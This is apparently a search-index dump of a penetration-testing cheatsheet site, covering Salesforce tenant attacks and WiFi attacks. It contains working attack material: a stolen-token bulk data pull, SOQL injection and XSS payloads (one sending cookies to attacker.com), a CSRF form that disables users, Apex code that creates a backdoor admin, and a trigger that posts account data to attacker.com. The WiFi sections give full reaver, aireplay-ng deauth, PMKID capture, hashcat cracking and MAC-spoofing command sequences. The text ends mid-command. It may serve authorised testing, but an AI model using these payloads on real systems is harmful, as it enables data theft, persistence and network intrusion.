\u201cPrivate\u201d for sensitive objects; enable \u201cSecure guest user record access\u201d in Sharing Settings.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#data-exposure-exfiltration-testing","title":"Data Exposure &amp; Exfiltration Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#51-insecure-record-visibility-via-api","title":"5.1 Insecure Record Visibility via API","text":"<p>Description: APIs may return records beyond user permissions due to misconfigured sharing settings. Root Cause: API queries often bypass UI restrictions if sharing isn\u2019t enforced. Enumeration Techniques: - Obtain API Token: Use a Connected App or user credentials for access. - Query Sensitive Objects (REST API): <pre><code>curl -H \"Authorization: Bearer &lt;YOUR_ACCESS_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Name,AnnualRevenue+FROM+Account+LIMIT+100\" \\\n     -o sensitive_data.json\n</code></pre> - Exploitation Steps:   1. Use a low-privilege account\u2019s token to query objects.   2. If data is returned, escalate by querying other objects or increasing the <code>LIMIT</code>.   3. Automate extraction with Python:      <pre><code>from simple_salesforce import Salesforce\nsf = Salesforce(instance_url='https://&lt;INSTANCE&gt;.salesforce.com', session_id='&lt;YOUR_ACCESS_TOKEN&gt;')\nresult = sf.query(\"SELECT Id, Name FROM Account LIMIT 1000\")\nprint(result['records'])\n</code></pre> Impact: Bulk extraction of sensitive data (e.g., PII, financials). Remediation: Enforce sharing rules on API access; limit API scopes for Connected Apps; monitor API usage for anomalies.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#52-exposed-reports-dashboards","title":"5.2 Exposed Reports &amp; Dashboards","text":"<p>Description: Misconfigured reports or dashboards in shared folders leak summarized data. Root Cause: Public or shared folder access controls are too permissive. Enumeration Techniques: - UI Navigation: Navigate to <code>Reports</code> or <code>Dashboards</code> tab, filter by \u201cAll Reports/Dashboards\u201d; check folder sharing via <code>Setup &gt; Report and Dashboard Folder Sharing</code>. - SOQL Query (Developer Console): <pre><code>SELECT Id, Name, FolderName FROM Report WHERE FolderName = 'Public Reports'\n</code></pre> - Exploitation Steps:   1. Log in as a low-privilege user.   2. Access a report/dashboard in a shared folder.   3. Export data if possible, or screenshot sensitive aggregations. Impact: Exposure of business-critical data or metrics. Remediation: Restrict visibility to specific roles; avoid \u201cView All\u201d permissions on folders; audit folder access.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#53-chatter-feed-information-leaks","title":"5.3 Chatter &amp; Feed Information Leaks","text":"<p>Description: Sensitive information (e.g., passwords, PII) may be disclosed in Chatter posts or feeds. Root Cause: Lack of Data Loss Prevention (DLP) or user training on secure communication. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT Body, CreatedById FROM FeedItem WHERE Body LIKE '%password%' OR Body LIKE '%secret%'\n</code></pre> - UI Navigation: Browse Chatter posts for sensitive disclosures. - Exploitation Steps:   1. Use API or UI to read Chatter posts.   2. Search for secrets, tokens, or PII in post content. Impact: Accidental exposure of credentials or sensitive data. Remediation: Implement DLP processes for Chatter; train users on data posting policies; review posts periodically.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#custom-code-business-logic-testing","title":"Custom Code &amp; Business Logic Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#61-soql-injection-in-apex","title":"6.1 SOQL Injection in Apex","text":"<p>Description: Dynamic SOQL queries with unsanitized user input allow query manipulation. Root Cause: String concatenation in SOQL queries instead of using bind variables. Enumeration Techniques: - UI Navigation: Review <code>Setup &gt; Custom Code &gt; Apex Classes</code> for dynamic SOQL:   <pre><code>// Vulnerable Code\npublic void searchAccounts(String searchTerm) {\n    String query = 'SELECT Id, Name FROM Account WHERE Name LIKE \\'%' + searchTerm + '%\\'';\n    List&lt;Account&gt; results = Database.query(query);\n    // Process results\n}\n</code></pre> - Static Analysis: Use PMD or Checkmarx to identify dynamic queries. - Exploitation Steps:   1. Identify user inputs feeding into dynamic SOQL (e.g., Visualforce page or Lightning component).   2. Inject a payload to manipulate the query:      - Input: <code>test%' OR '1'='1</code>      - Resulting Query: <code>SELECT Id, Name FROM Account WHERE Name LIKE '%test%' OR '1'='1%'</code>      - Effect: Returns all records.   3. Deploy a test Visualforce page to trigger:      <pre><code>&lt;apex:page controller=\"VulnerableController\"&gt;\n    &lt;apex:form&gt;\n        &lt;apex:inputText value=\"{!searchTerm}\" /&gt;\n        &lt;apex:commandButton action=\"{!searchAccounts}\" value=\"Search\" /&gt;\n    &lt;/apex:form&gt;\n&lt;/apex:page&gt;\n</code></pre> Impact: Full data extraction or access control bypass. Remediation: Use bind variables:   <pre><code>String searchTerm = '%' + userInput + '%';\nList&lt;Account&gt; results = [SELECT Id, Name FROM Account WHERE Name LIKE :searchTerm];\n</code></pre>   Conduct regular code reviews and enforce static analysis.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#62-insecure-direct-object-reference-idor-in-visualforce","title":"6.2 Insecure Direct Object Reference (IDOR) in Visualforce","text":"<p>Description: Manipulating record IDs in URLs or parameters allows unauthorized data access. Root Cause: Lack of server-side access checks on record IDs. Enumeration Techniques: - UI Navigation: Identify Visualforce pages or Lightning components accepting record IDs (e.g., <code>?id=001xxxxxxxxxxxx</code>). - Code Review (Developer Console): <pre><code>// Vulnerable Code\npublic Account getAccount() {\n    String recordId = ApexPages.currentPage().getParameters().get('id');\n    return [SELECT Id, Name, AnnualRevenue FROM Account WHERE Id = :recordId];\n}\n</code></pre> - Exploitation Steps:   1. Access a Visualforce page with a record ID parameter (e.g., <code>https://&lt;INSTANCE&gt;.visual.force.com/apex/MyPage?id=001xxxxxxxxxxxx</code>).   2. Modify the <code>id</code> parameter to another record ID (e.g., increment or use a known ID).   3. Confirm if unauthorized data is displayed. Impact: Unauthorized access to sensitive records. Remediation: Implement server-side checks:   <pre><code>public Account getAccount() {\n    String recordId = ApexPages.currentPage().getParameters().get('id');\n    Account acc = [SELECT Id, Name FROM Account WHERE Id = :recordId];\n    if (!Schema.sObjectType.Account.isAccessible()) {\n        throw new AuraHandledException('Access Denied');\n    }\n    return acc;\n}\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#63-insecure-apex-execution-context-crudfls-bypass","title":"6.3 Insecure Apex Execution Context (CRUD/FLS Bypass)","text":"<p>Description: Apex classes running in system context bypass sharing rules and Field-Level Security (FLS) unless explicitly enforced. Root Cause: Developers assume platform security or use <code>without sharing</code> for functionality. Enumeration Techniques: - Static Analysis (Code Review): Search for <code>without sharing</code> or missing <code>WITH SECURITY_ENFORCED</code> in SOQL.   <pre><code>// Vulnerable Code\npublic with sharing class CaseController {\n    @AuraEnabled\n    public static void saveCaseDetails(Id caseId, String accountNameToUpdate) {\n        Case c = [SELECT Id, AccountId FROM Case WHERE Id = :caseId];\n        Account a = new Account(Id = c.AccountId, Name = accountNameToUpdate);\n        update a; // System context bypasses user permissions on Account!\n    }\n}\n</code></pre> - Dynamic Analysis (Burp Suite):   1. Capture a legitimate request to the <code>@AuraEnabled</code> method via <code>/aura</code> endpoint.   2. Modify parameters (e.g., <code>accountNameToUpdate</code>) in Burp Repeater to test unauthorized writes.   3. Verify if the update succeeds despite lacking direct edit permissions. Impact: Critical privilege escalation to read/write restricted data. Remediation: Use <code>WITH SECURITY_ENFORCED</code> for SOQL:   <pre><code>List&lt;Account&gt; accs = [SELECT Id FROM Account WITH SECURITY_ENFORCED];\n</code></pre>   For DML, manually check permissions or use <code>Security.stripInaccessible()</code> to remove inaccessible fields.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#platform-configuration-misconfiguration-testing","title":"Platform Configuration &amp; Misconfiguration Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#71-default-sharing-on-custom-objects","title":"7.1 Default Sharing on Custom Objects","text":"<p>Description: Custom objects with loose sharing defaults expose data unintentionally. Root Cause: Developers or admins set sharing to <code>ReadWrite</code> or fail to configure OWD. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT DeveloperName, SharingModel FROM CustomObject WHERE SharingModel = 'ReadWrite'\n</code></pre> - UI Navigation: Check <code>Setup &gt; Object Manager &gt; [Custom Object] &gt; Sharing Settings</code>. - Exploitation Steps:   1. Log in as a low-privilege user.   2. Access the custom object via UI or API to view/edit records not owned by the user. Impact: Accidental data exposure across users. Remediation: Set sharing to <code>Private</code> by default for custom objects; apply specific sharing rules as needed.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#72-debug-log-exposure","title":"7.2 Debug Log Exposure","text":"<p>Description: Overly verbose debug logs may leak sensitive data like credentials or session tokens. Root Cause: Debug logs set to high verbosity without filtering sensitive information. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Debug Logs</code> for logs on privileged actions or users. - Exploitation Steps:   1. If accessible, review logs for sensitive data (e.g., API tokens, passwords).   2. Trigger debug logging via custom code or actions to capture data. Impact: Exposure of secrets or internal logic for further attacks. Remediation: Minimize debug logging in production; mask sensitive fields in logs; restrict log access to admins.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#api-integration-security-testing","title":"API &amp; Integration Security Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#81-over-scoped-connected-apps","title":"8.1 Over-Scoped Connected Apps","text":"<p>Description: Connected Apps with excessive OAuth scopes (e.g., <code>full</code> or <code>api</code>) allow unintended data access. Root Cause: Apps request broad scopes beyond minimal requirements. Enumeration Techniques: - UI Navigation: Review <code>Setup &gt; Apps &gt; Connected Apps</code> for app scopes. - Exploitation Steps:   1. If authorized, log in to the Connected App or steal an OAuth token via phishing.   2. Use the token to query sensitive data:      <pre><code>curl -H \"Authorization: Bearer &lt;STOLEN_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Name+FROM+Account+LIMIT+1000\" \\\n     -o stolen_data.json\n</code></pre> Impact: Unauthorized data access or manipulation via API. Remediation: Limit Connected App scopes to minimal required access; enforce admin approval for app installations; monitor OAuth token usage.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#82-excessive-api-permissions","title":"8.2 Excessive API Permissions","text":"<p>Description: Standard or integration users with API access (<code>ApiEnabled</code>) can extract data programmatically. Root Cause: Profiles unnecessarily granted API permissions. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT Name, PermissionsApiEnabled FROM Profile WHERE PermissionsApiEnabled = TRUE\n</code></pre> - Exploitation Steps:   1. Use valid credentials to access REST/SOAP APIs:      <pre><code>curl -H \"Authorization: Bearer &lt;ACCESS_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v58.0/sobjects/\"\n</code></pre>   2. Enumerate all accessible objects and extract data. Impact: Mass data exfiltration or lateral movement. Remediation: Restrict API access to specific profiles; use managed packages or named credentials for integrations.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#client-side-web-vulnerabilities-testing","title":"Client-Side &amp; Web Vulnerabilities Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#91-lightning-web-component-lwc-dom-based-xss","title":"9.1 Lightning Web Component (LWC) DOM-Based XSS","text":"<p>Description: Unsanitized user input in LWCs can lead to JavaScript injection and code execution. Root Cause: Use of <code>innerHTML</code> or similar DOM manipulation methods without sanitization. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Custom Code &gt; Lightning Components</code> for custom LWCs. - Code Review (Developer Console): <pre><code>// Vulnerable LWC\nimport { LightningElement, api } from 'lwc';\nexport default class VulnerableComponent extends LightningElement {\n    @api userInput;\n    renderedCallback() {\n        this.template.querySelector('div').innerHTML = this.userInput; // XSS risk\n    }\n}\n</code></pre> - Exploitation Steps:   1. Pass a malicious payload via URL or form input:      - Payload: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>   2. Confirm if the payload executes in the browser.   3. Escalate to steal session cookies:      - Payload: <code>&lt;script&gt;document.location='https://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;</code> Impact: Session hijacking, data theft, or malicious actions. Remediation: Avoid <code>innerHTML</code>; use safe DOM APIs:   <pre><code>this.template.querySelector('div').textContent = this.userInput; // Safer\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#92-csrf-clickjacking","title":"9.2 CSRF &amp; Clickjacking","text":"<p>Description: Lack of CSRF tokens or anti-frame headers allows cross-origin manipulation or UI trickery. Root Cause: Missing protections in custom endpoints or platform pages. Enumeration Techniques: - Check Headers: Use browser dev tools to inspect response headers for <code>X-Frame-Options</code> or <code>Content-Security-Policy</code>. - Exploitation Steps:   1. Attempt to embed sensitive pages in an iframe to test clickjacking.   2. Craft a CSRF payload for a custom endpoint without tokens:      <pre><code>&lt;form action=\"https://&lt;INSTANCE&gt;.salesforce.com/setup/own/users.jsp\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"save\" value=\"1\"&gt;\n    &lt;input type=\"hidden\" name=\"id\" value=\"005xxxxxxxxxxxx\"&gt;\n    &lt;input type=\"hidden\" name=\"IsActive\" value=\"false\"&gt;\n    &lt;input type=\"submit\" value=\"Disable User Account\"&gt;\n&lt;/form&gt;\n</code></pre> Impact: Social engineering or unauthorized actions on behalf of users. Remediation: Ensure anti-clickjacking headers are sent; validate CSRF tokens on custom endpoints.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#advanced-exploitation-privilege-escalation","title":"Advanced Exploitation &amp; Privilege Escalation","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#101-flow-builder-privilege-escalation","title":"10.1 Flow Builder Privilege Escalation","text":"<p>Description: Misconfigured Flows running in system context allow privilege escalation. Root Cause: Flows ignore user permissions if not explicitly restricted. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Process Automation &gt; Flows</code> for user-input-driven Flows updating sensitive objects. - Exploitation Steps:   1. Trigger a Flow as a low-privilege user (e.g., via custom button or Visualforce page).   2. Provide inputs to update a record (e.g., change ownership or field values).   3. Confirm if unauthorized updates occur. Impact: Data tampering or privilege escalation. Remediation: Run Flows in user context; validate inputs and permissions within Flows; limit access to specific profiles.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#102-system-context-abuse-via-apex-triggers","title":"10.2 System Context Abuse via Apex Triggers","text":"<p>Description: Apex triggers running in system context can be abused to perform privileged actions. Root Cause: Triggers execute with elevated privileges unless restricted. Enumeration Techniques: - Code Review (Developer Console): Review triggers in <code>Setup &gt; Custom Code &gt; Apex Triggers</code> for updates or callouts. - Exploitation Steps:   1. Identify a trigger on a writable object (e.g., Case update).   2. Manipulate input to influence trigger behavior (e.g., update a related Account).   3. Confirm if unauthorized actions occur. Impact: Bypassing sharing rules or FLS for data manipulation. Remediation: Explicitly check permissions in triggers; avoid system context unless necessary.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#persistence-defense-evasion","title":"Persistence &amp; Defense Evasion","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#111-backdoor-via-malicious-apex","title":"11.1 Backdoor via Malicious Apex","text":"<p>Description: Deploying malicious Apex code provides persistent access or backdoors. Root Cause: Users with <code>Customize Application</code> or <code>Author Apex</code> can deploy code. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT Name, NamespacePrefix FROM ApexClass WHERE Name LIKE '%admin%' OR Name LIKE '%backdoor%'\n</code></pre> - Exploitation Steps:   1. If code deployment is in scope, deploy a malicious class to create a backdoor admin user:      <pre><code>public class AddAdmin {\n    public static void escalatePrivs() {\n        Profile p = [SELECT Id FROM Profile WHERE Name='System Administrator'];\n        User u = new User(\n            Alias = 'pwned',\n            Email='attacker@example.com',\n            EmailEncodingKey='UTF-8',\n            LastName='Admin',\n            LanguageLocaleKey='en_US',\n            LocaleSidKey='en_US',\n            ProfileId = p.Id,\n            TimeZoneSidKey='America/Los_Angeles',\n            UserName='pwned_user@example.com.test'\n        );\n        insert u;\n    }\n}\n</code></pre>   2. Execute via Developer Console: <code>AddAdmin.escalatePrivs();</code>. Impact: Persistent admin access for long-term compromise. Remediation: Restrict code deployment to trusted admins; enforce code reviews; monitor Apex changes via audit logs.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#112-data-exfiltration-via-unmonitored-channels","title":"11.2 Data Exfiltration via Unmonitored Channels","text":"<p>Description: Use legitimate Salesforce features to exfiltrate data covertly. Root Cause: Lack of monitoring on outbound channels like email or callouts. Exploitation Steps:   1. Modify an Apex trigger to send data to an attacker server via HTTP callout:      <pre><code>trigger AccountTrigger on Account (after insert) {\n    for (Account a : Trigger.new) {\n        HttpRequest req = new HttpRequest();\n        req.setEndpoint('https://attacker.com/log');\n        req.setMethod('POST');\n        req.setBody('Stolen Data: ' + a.Name + ' - Revenue: ' + a.AnnualRevenue);\n        new Http().send(req);\n    }\n}\n</code></pre>   2. Configure email alerts to send reports to external addresses. Impact: Covert data theft bypassing DLP. Remediation: Monitor outbound callouts and emails; restrict external communications in Apex code.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#reporting-remediation-framework","title":"Reporting &amp; Remediation Framework","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#objective_1","title":"Objective","text":"<p>Deliver clear, actionable findings to the client with evidence and remediation guidance.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#steps_1","title":"Steps","text":"<ul> <li>Document Findings: For each vulnerability, include:</li> <li>Description, root cause, and business impact.</li> <li>Screenshots, API responses, or logs as proof of concept (PoC).</li> <li>Sample payloads or code used during exploitation.</li> <li>Prioritize Issues: Use CVSS scores or business impact (e.g., data breach risk) to rank findings.</li> <li>Provide Remediation: Offer specific fixes as detailed in each section above, tailored to the client\u2019s environment.</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#impact_1","title":"Impact","text":"<p>Ensures the client can address vulnerabilities effectively, reducing risk and improving security posture.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#tools-references","title":"Tools &amp; References","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#tools_1","title":"Tools","text":"<ul> <li>CLI &amp; Automation: Salesforce CLI (<code>sfdx</code>), <code>simple_salesforce</code> (Python), <code>jsforce</code> (Node.js)</li> <li>API Testing: Postman, Burp Suite (intercept OAuth flows), cURL</li> <li>Static Analysis: PMD, Checkmarx, SonarQube (for Apex and LWC code)</li> <li>Browser Extensions: Salesforce Inspector (Chrome) for metadata exploration</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#references","title":"References","text":"<ul> <li>Salesforce Security Guide (Salesforce documentation)</li> <li>OWASP Top 10 (relevant to web and API vulnerabilities)</li> <li>CIS Salesforce Benchmarks (configuration hardening)</li> <li>Trailhead Security Modules (official Salesforce training)</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%204/#final-thoughts","title":"Final Thoughts","text":"<p>Salesforce tenants are complex environments with diverse attack surfaces including access controls, custom code, APIs, and integrations. As an elite tester, focus on chaining vulnerabilities (e.g., IDOR to API data exposure) for maximum impact. Salesforce\u2019s robust logging and monitoring can detect malicious activity, so operate strictly within RoE. Break responsibly to secure the cloud.</p>"},{"location":"Cheatsheets/wifi/Attacking/","title":"Attacking","text":""},{"location":"Cheatsheets/wifi/Attacking/#wpawpa2","title":"WPA/WPA2","text":"<p>Main attack methods:</p> <ol> <li>Check if WPS is enabled and brute-force the PIN.</li> <li>Capture the 4-way handshake and perform a dictionary attack to recover the PSK.</li> <li>Execute a PMKID attack on vulnerable access points.</li> </ol>"},{"location":"Cheatsheets/wifi/Attacking/#wps-brute-force","title":"WPS Brute force","text":"<p>Check if wps is enabled:</p> <p>with airodump: <pre><code>airodump-ng wlan0mon -c 1 --wps\n</code></pre></p> <p>0:  WPS is not supported by the access point. 1:  WPS is enabled but not configured. 2:  WPS is enabled and configured.</p> <p>with wash: <pre><code>wash -i wlan0mon\n</code></pre> if Lck = No, WPS is enabled.</p> <p>Also, determine the vendor with the first three sets from the MAC <pre><code>grep -i \"28-B2-BD\" /var/lib/ieee-data/oui.txt\n</code></pre></p> <p>Bruteforce WPS key with reaver</p> <p>turn off monitor mode from airmon to ensure Reaver works. <pre><code>airmon-ng stop wlan0mon\n</code></pre></p> <p>use the iw command to add a new interface named mon0 and set its type to monitor mode.</p> <pre><code>iw dev wlan0 interface add mon0 type monitor\nifconfig mon0 up\n</code></pre> <p>Launch Reaver specifying the BSSID of our target, the appropriate channel, and our interface in monitor mode (mon0)</p> <pre><code>reaver -i mon0 -c 1 -b 28:B2:BD:F4:FF:F1\n</code></pre>"},{"location":"Cheatsheets/wifi/Attacking/#cracking-mic-4-way-handshake","title":"Cracking MIC (4-Way Handshake)","text":"<p>Capture the MIC</p> <pre><code>sudo airmon-ng start wlan0\n</code></pre> <p>Identify networks (save to file WPA)</p> <pre><code>airodump-ng wlan0mon -c 1 -w WPA\n</code></pre> <p>Deauth clients and capture handshake on reconnect</p> <pre><code>aireplay-ng -0 5 -a &lt;AP BSSID&gt; -c &lt;STATION&gt; wlan0mon\n</code></pre> <p>After a few seconds a WPA handshake should be captured in the airodump output. <pre><code> CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ][ WPA handshake: 80:2D:BF:FE:13:83 \n</code></pre></p> <p>We need to ensure we've captured the complete handshake before attempting to crack</p> <p>With cowpatty: <code>-c</code> = check mode <pre><code>cowpatty -c -r WPA-01.cap\n</code></pre></p> <p>or with wireshark:</p> <p>check the following:</p> <ul> <li>All four EAPOL messages exist per each handshake in sequential order</li> <li>Key nonce values are the same in message 1 and 3</li> <li>For message four, we should see no key nonce value and only a MIC value.</li> </ul> <p>Crack the handshake</p> <p>with cowpatty: <pre><code>cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s &lt;SSID&gt;\n</code></pre></p> <p>or with aircrack</p> <pre><code>aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap \n</code></pre>"},{"location":"Cheatsheets/wifi/Attacking/#pmkid-attack","title":"PMKID Attack","text":"<p>This attack utilizes a feature of WPA and WPA2 protocols that allows roaming (switching from one access point to another seamlessly), routers store the \"PMKID\" in a cache to make roaming easier. This attack is so powerful because it allows an attacker to capture and crack the PMK without first deauthing clients.</p> <p>Put interface into monitor mode <pre><code>sudo airmon-ng start wlan0\n</code></pre></p> <p>scan for the target network and determine if it is vulnerable to the PMKID attack. We need to monitor for these three status codes: 1. EAPOL 2. ASSOCIATION and REASSOCIATION 3. EAPOL and ASSOCIATION and REASSOCIATION</p>"},{"location":"Cheatsheets/wifi/Attacking/#for-hcxtools-629","title":"For hcxtools &lt;= 6.2.9","text":"<p><pre><code>hcxdumptool -i wlan0mon --enable_status=3\n</code></pre> We want to see the <code>PMKID</code> in the output, now we discover the bssid with aerodump</p> <pre><code>airodump-ng wlan0mon --essid targetnetwork\n</code></pre> <p>Once we have the bssid of the target, we can properly target with hcxdumptool</p> <pre><code>hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=E2:73:E7:F5:98:91 --filtermode=2 -o PMKIDCap.pcap\n</code></pre> <p>I can take a very long time to capture the PMKID, you can speed it up by executing the command again</p> <p>Now we can convert the pcap to a hash to crack</p> <pre><code>hcxpcapngtool -o hash PMKIDCap.pcap\n</code></pre> <p>Now Crack the hash</p> <pre><code>hashcat -m 22000 --force hash /opt/wordlist.txt\nhashcat -m 22000 --force hash /opt/wordlist.txt --show\n</code></pre>"},{"location":"Cheatsheets/wifi/Attacking/#for-hcxtools-630","title":"For hcxtools &gt;= 6.3.0","text":"<p>Generate a BPF file</p> <p>One AP:</p> <pre><code>hcxdumptool --bpfc=\"wlan addr3 &lt;BSSID&gt;\" &gt; SSID.bpf\n</code></pre> <p>Multiple:</p> <pre><code>hcxdumptool --bpfc=\"wlan addr3 &lt;BSSID1&gt; or wlan addr3 &lt;BSSID2&gt;\" &gt; SSID.bpf\n</code></pre> <p>Run against target</p> <pre><code>sudo hcxdumptool --rds=1 -F --bpf=SSID.bpf -i wlan1mon -w outfile.pcapng\n</code></pre> <p>You are looking for a <code>+</code> under the 3 or the P column. Convert to hash and crack (dictionary)</p> <pre><code>hcxpcapngtool -o hash PMKIDCap.pcap\nhashcat -m 22000 --force hash /opt/wordlist.txt\n</code></pre>"},{"location":"Cheatsheets/wifi/Attacking/#deauth-attacks","title":"Deauth attacks","text":"<p>List attack modes</p> <pre><code>aireplay-ng\n\n Attack modes (numbers can still be used):\n      --deauth      count : deauthenticate 1 or all stations (-0)\n      --fakeauth    delay : fake authentication with AP (-1)\n      --interactive       : interactive frame selection (-2)\n      --arpreplay         : standard ARP-request replay (-3)\n      --chopchop          : decrypt/chopchop WEP packet (-4)\n      --fragment          : generates valid keystream   (-5)\n      --caffe-latte       : query a client for new IVs  (-6)\n      --cfrag             : fragments against a client  (-7)\n      --migmode           : attacks WPA migration mode  (-8)\n      --test              : tests injection and quality (-9)\n\n      --help              : Displays this usage screen\n</code></pre> Attack Attack Name <code>Attack 0</code> Deauthentication <code>Attack 1</code> Fake authentication <code>Attack 2</code> Interactive packet replay <code>Attack 3</code> ARP request replay attack <code>Attack 4</code> KoreK chopchop attack <code>Attack 5</code> Fragmentation attack <code>Attack 6</code> Cafe-latte attack <code>Attack 7</code> Client-oriented fragmentation attack <code>Attack 8</code> WPA Migration Mode <code>Attack 9</code> Injection test <p>Before sending deauthentication frames, it's important to verify if our wireless card can successfully inject frames into the target access point (AP).</p> <ol> <li>Enable monitor mode on channel</li> </ol> <pre><code>airmon-ng start wlan0 1\n</code></pre> <ol> <li>test for packet injection</li> </ol> <p><pre><code>sudo aireplay-ng --test wlan0mon\n</code></pre> (we should see <code>Injection is working!</code>)</p> <p>Now we know we can inject packets with our interface, lets perform the deauth</p> <p>Identify the AP <pre><code>sudo airodump-ng wlan0mon\n\nCH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][\n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         \n 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB \n 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             \n\n BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes\n\n 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           HTB \n (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4            \n 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           HTB \n 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           jhony\n</code></pre></p> <p>From the above output, we can see that there are three available WiFi networks, and <code>two clients</code> are connected to the network named <code>HTB</code>. Let's send a deauthentication request to one of the clients with the station ID <code>00:0F:B5:32:31:31</code>.</p> <p><pre><code>sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon\n</code></pre> - <code>-0</code> means deauthentication - <code>5</code> is the number of deauths to send (you can send multiple if you wish); <code>0</code> means send them continuously - <code>-a 00:14:6C:7A:41:81</code> is the MAC address of the access point - <code>-c 00:0F:B5:32:31:31</code> is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated - <code>wlan0mon</code> is the interface name</p> <p>Once the clients are deauthenticated from the AP, we can continue observing <code>airodump-ng</code> to see when they reconnect.</p> <pre><code>sudo airodump-ng wlan0mon\n\nCH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7A:41:81\n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         \n 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB \n 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             \n\n BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes\n\n 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24   212     145   EAPOL  HTB \n (not associated)   00:14:A4:3F:8D:13   19    0-0      0       4            \n 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36     0       5          HTB \n 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54     0       9          jhony\n</code></pre> <p>In the output above, we can see that after sending the deauthentication packet, the client disconnects and then reconnects. This is evidenced by the increase in <code>Lost</code> packets and <code>Frames</code> count.</p> <p>Additionally, a <code>four-way handshake</code> would be captured by <code>airodump-ng</code>, as shown in the output. By using the <code>-w</code> option in airodump-ng, we can save the captured WPA handshake into a <code>.pcap</code> file. This file can then be used with tools like <code>aircrack-ng</code> to crack the pre-shared key (PSK)</p>"},{"location":"Cheatsheets/wifi/Bypassing%20MAC%20Filtering/","title":"Bypassing MAC Filtering","text":"<p>First scan for available networks <pre><code>sudo airodump-ng wlan0mon\n</code></pre></p> <p>Find the network you're trying to connect to and copy one of the clients mac addresses.</p> <p>Just stealing a client mac might suck due to mac collisions. </p> <p>A better method is to either 1. deauth the client or 2. wait for the client to disconnect naturally before connecting. </p> <p>We can also check if there is a 5 GHz band available for the ESSID. If the 5 GHz band is available, we can attempt to connect to the network using that frequency, which would avoid collision events since most clients are connected to the 2.4 GHz band.</p> <pre><code>sudo airodump-ng wlan0mon --band a\n</code></pre> <p>https://github.com/alobbs/macchanger</p> <pre><code>sudo macchanger wlan0\n</code></pre> <p>Change mac:</p> <p><pre><code>sudo ifconfig wlan0 